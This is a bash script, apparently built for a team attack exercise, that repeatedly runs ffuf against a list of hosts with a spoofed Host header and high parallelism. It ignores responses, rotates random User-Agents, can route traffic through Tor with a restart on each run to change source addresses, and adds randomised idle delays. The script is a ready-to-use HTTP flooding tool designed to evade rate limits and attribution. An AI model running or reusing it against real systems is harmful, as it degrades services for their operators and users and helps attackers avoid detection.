#!/bin/bash
HOST=${1}
TEAM=${2}
RUNS=${3}
ATTACKTIME=${4}
IDLETIME=${5}
PARALLEL=${6} #default 40
DELAY=${7}
ISTOR=${8}
TO=3
UAS="ua.txt"
OPT=""
TOFUZZ="dscqehn.txt"

for run in $( seq 1 ${RUNS} ); do
        UA=$(cat ${UAS} | sort -R  | head -1)
        if [ ${ISTOR} == "TOR" ]; then 
                /etc/init.d/tor restart; 
                ./ffuf -w ${TOFUZZ} -u http://FUZZ/target.html -H "teamname: ${TEAM}" -H "User-Agent: ${UA}" -H "Host: ${HOST}" -mc 0 -ignore-body -timeout ${TO} -maxtime ${ATTACKTIME} -maxtime-job ${ATTACKTIME} -t ${PARALLEL} -p ${DELAY} -x "socks5://127.0.0.1:9050"
        else
                ./ffuf -w ${TOFUZZ} -u http://FUZZ/target.html -H "teamname: ${TEAM}" -H "User-Agent: ${UA}" -H "Host: ${HOST}" -mc 0 -ignore-body -timeout ${TO} -maxtime ${ATTACKTIME} -maxtime-job ${ATTACKTIME} -t ${PARALLEL} -p ${DELAY}
        fi
        sleep "$(( $RANDOM % ${IDLETIME} ))"
done 